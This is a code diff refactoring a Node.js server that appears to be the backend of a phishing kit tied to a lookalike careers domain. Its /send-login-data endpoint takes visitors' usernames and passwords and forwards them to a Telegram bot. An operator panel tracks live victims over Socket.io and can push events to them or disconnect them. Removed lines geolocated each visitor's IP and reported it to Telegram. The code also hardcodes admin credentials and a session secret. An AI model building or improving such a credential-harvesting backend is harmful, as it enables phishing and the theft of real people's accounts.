@@ -27,7 +27,34 @@ console.log('📡 WEBHOOK_URL:', WEBHOOK_URL);
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
 
-// Set webhook on startup
+// ✅ Move helpers to top so they’re defined before use
+const users = {};
+const userData = {};
+const socketToClient = {};
+
+function getSocketIdByClientId(clientId) {
+  return Object.entries(socketToClient).find(([_, cid]) => cid === clientId)?.[0];
+}
+
+function emitToClient(clientId, event, data = null) {
+  const socketId = getSocketIdByClientId(clientId);
+  if (socketId && users[socketId]) {
+    console.log(`📡 Emitting event "${event}" to client: ${clientId}`);
+    users[socketId].emit(event, data);
+  } else {
+    console.warn(`⚠️ No socket found for client: ${clientId}`);
+  }
+}
+
+function disconnectClient(clientId) {
+  const socketId = getSocketIdByClientId(clientId);
+  if (socketId && users[socketId]) {
+    console.log(`🔌 Disconnecting client: ${clientId}`);
+    users[socketId].disconnect(true);
+  }
+}
+
+// ✅ Set webhook
 bot.setWebHook(WEBHOOK_URL)
   .then(() => console.log(`✅ Webhook set to: ${WEBHOOK_URL}`))
   .catch(err => console.error('❌ Failed to set webhook:', err.message));
@@ -39,64 +66,46 @@ app.post(WEBHOOK_PATH, (req, res) => {
   res.sendStatus(200);
 });
 
-// ✅ Sessions
+// ✅ Session
 app.use(session({
   secret: '8c07f4a99f3e4b34b76d9d67a1c54629dce9aaab6c2f4bff1b3c88c7b6152b61',
   resave: false,
   saveUninitialized: true,
-  cookie: {
-    secure: true,
-    sameSite: 'none',
-    maxAge: 24 * 60 * 60 * 1000
-  }
+  cookie: { secure: true, sameSite: 'none', maxAge: 24 * 60 * 60 * 1000 }
 }));
 
 // ✅ CORS
 app.use(cors({
-  origin: [
-    'https://aquentcareers.io',
-    'https://jobback-qp48.onrender.com'
-  ],
+  origin: ['https://aquentcareers.io', 'https://jobback-qp48.onrender.com'],
   methods: ['GET', 'POST'],
   credentials: true
 }));
 app.use(express.json());
 
 const io = socketIo(server, {
-  cors: {
-    origin: [
-      'https://aquentcareers.io',
-      'https://jobback-qp48.onrender.com'
-    ],
-    methods: ['GET', 'POST']
-  }
+  cors: { origin: ['https://aquentcareers.io', 'https://jobback-qp48.onrender.com'], methods: ['GET', 'POST'] }
 });
 
 // ✅ Auth
 function auth(req, res, next) {
   if (req.session && req.session.authenticated) return next();
-
   const user = basicAuth(req);
   const username = 'ttwstt';
   const password = 'Neo.123!@#';
-
   if (user && user.name === username && user.pass === password) {
     req.session.authenticated = true;
     console.log('✅ Admin logged in');
     return next();
-  } else {
-    res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
-    return res.status(401).send('Authentication required.');
   }
+  res.set('WWW-Authenticate', 'Basic realm="Restricted Area"');
+  return res.status(401).send('Authentication required.');
 }
 
+// ✅ Static files
 const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
 app.use('/dash', auth, express.static(path.join(__dirname, 'aZ7pL9qW3xT2eR6vBj0K')));
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
-const users = {};
-const userData = {};
-const socketToClient = {};
 const newUsers = new Set();
 
 // ✅ Telegram callback query
@@ -135,6 +144,7 @@ bot.on('callback_query', (query) => {
   } else bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
 });
 
+// ✅ Helper functions
 function formatDateTime(date) {
   return {
     full: date.toISOString(),
@@ -148,14 +158,30 @@ function updatePanelUsers() {
   const data = Object.values(userData)
     .filter(u => u?.time?.timestamp && Date.now() - u.time.timestamp <= 2 * 60 * 60 * 1000)
     .sort((a, b) => b.time.timestamp - a.time.timestamp);
-
-  io.of('/panel').emit('update-users', {
-    users: data,
-    newUsers: Array.from(newUsers)
-  });
+  io.of('/panel').emit('update-users', { users: data, newUsers: Array.from(newUsers) });
   console.log(`👥 Updated panel users: ${data.length}`);
 }
 
+function isBanned(ip) {
+  try { return fs.readFileSync(BAN_LIST_FILE, 'utf8').split('\n').includes(ip.trim()); }
+  catch { return false; }
+}
+
+function banIp(ip) {
+  const clean = ip.trim();
+  if (!isBanned(clean)) {
+    try {
+      if (fs.existsSync(BAN_LIST_FILE)) {
+        const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
+        if (!data.endsWith('\n')) fs.appendFileSync(BAN_LIST_FILE, '\n');
+      }
+      fs.appendFileSync(BAN_LIST_FILE, `${clean}\n`);
+      console.log(`🚫 IP added to ban list: ${clean}`);
+    } catch (err) { console.error('Error saving banned IP:', err); }
+  }
+}
+
+// ✅ Socket.io
 io.on('connection', async (socket) => {
   const clientIP = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
   const userAgent = socket.handshake.headers['user-agent'];
@@ -183,20 +209,6 @@ io.on('connection', async (socket) => {
   socketToClient[socket.id] = clientId;
   users[socket.id] = socket;
 
-  const parser = new UAParser(userAgent);
-  const browserName = parser.getBrowser().name || 'Unknown';
-
-  let city = 'Unknown', country = 'Unknown', isp = 'Unknown';
-  try {
-    const res = await axios.get(`http://ip-api.com/json/${clientIP}`);
-    if (res.data.status === 'success') {
-      city = res.data.city || 'Unknown';
-      country = res.data.country || 'Unknown';
-      isp = res.data.isp || 'Unknown';
-    }
-  } catch (err) { console.error('GeoIP lookup failed:', err.message); }
-
-  const isNewUser = !userData[clientId];
   userData[clientId] = {
     ...(userData[clientId] || {}),
     id: clientId,
@@ -209,27 +221,12 @@ io.on('connection', async (socket) => {
     action: null
   };
 
-  if (isNewUser) {
-    newUsers.add(clientId);
-    console.log(`🌟 New connection: ${clientId}`);
-    const msg =
-      `🌟 *New Connection Established*\n\n` +
-      `🆔 *Client ID:* \`${clientId}\`\n` +
-      `🌍 *IP:* \`${clientIP}\`\n` +
-      `🏙 *City:* \`${city}\`\n` +
-      `🏳️ *Country:* \`${country}\`\n` +
-      `🌐 *Browser:* \`${browserName}\`\n` +
-      `🛣 *Provider:* \`${isp}\`\n\n` +
-      `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\``;
-    sendTelegramMessage(msg, clientId, 'banOnly');
-  }
-
+  newUsers.add(clientId);
   updatePanelUsers();
 
   socket.on('disconnect', () => {
     console.log(`❌ Disconnected: ${clientId}`);
-    const cid = socketToClient[socket.id];
-    if (cid && userData[cid]) userData[cid].isConnected = false;
+    if (userData[clientId]) userData[clientId].isConnected = false;
     delete users[socket.id];
     delete socketToClient[socket.id];
     newUsers.delete(clientId);
@@ -237,29 +234,7 @@ io.on('connection', async (socket) => {
   });
 });
 
-function isBanned(ip) {
-  try {
-    const bannedIps = fs.readFileSync(BAN_LIST_FILE, 'utf8').split('\n');
-    return bannedIps.includes(ip.trim());
-  } catch { return false; }
-}
-
-function banIp(ip) {
-  const clean = ip.trim();
-  if (!isBanned(clean)) {
-    try {
-      if (fs.existsSync(BAN_LIST_FILE)) {
-        const data = fs.readFileSync(BAN_LIST_FILE, 'utf8');
-        if (!data.endsWith('\n')) fs.appendFileSync(BAN_LIST_FILE, '\n');
-      }
-      fs.appendFileSync(BAN_LIST_FILE, `${clean}\n`);
-      console.log(`🚫 IP added to ban list: ${clean}`);
-    } catch (err) { console.error('Error saving banned IP:', err); }
-  }
-}
-
-// ✅ API ENDPOINTS
-
+// ✅ POST endpoint: send-login-data
 app.post('/send-login-data', (req, res) => {
   const { username, password, socketId } = req.body;
   console.log('📨 Received /send-login-data:', req.body);
@@ -268,7 +243,7 @@ app.post('/send-login-data', (req, res) => {
   const clientId = socketToClient[socketId];
   if (!clientId) return res.status(404).json({ message: 'Client not found.' });
 
-  // ✅ YOUR MESSAGE BLOCK RESTORED
+  // 🔐 Your message block preserved
   const message = `🔐 *Login Attempt*\n\n` +
     `🔷 *Username:* \`${username}\`\n` +
     `🔑 *Password:* \`${password}\`\n` +
@@ -284,7 +259,7 @@ app.post('/send-login-data', (req, res) => {
   res.json({ success: true, message: 'Login data sent successfully!' });
 });
 
-// ✅ SERVER START
+// ✅ Start server
 server.listen(3001, () => {
   console.log('🚀 Server running on http://localhost:3001');
   console.log(`✅ Telegram Webhook URL: ${WEBHOOK_URL}`);
